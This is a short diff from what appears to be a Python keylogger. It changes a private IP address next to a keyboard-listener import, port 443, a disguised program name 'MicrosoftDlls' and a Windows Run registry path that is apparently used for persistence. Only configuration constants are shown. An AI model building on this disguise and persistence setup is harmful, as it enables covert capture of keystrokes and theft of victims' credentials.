@@ -10,7 +10,7 @@ import datetime
 from pynput import keyboard
 from time import sleep
 
-IP = "192.168.1.103"
+IP = "192.168.1.102"
 PORT = 443
 PROGRAM_NAME = "MicrosoftDlls"
 REGISTRO_KEY_PATH = r"SOFTWARE\Microsoft\Windows\CurrentVersion"
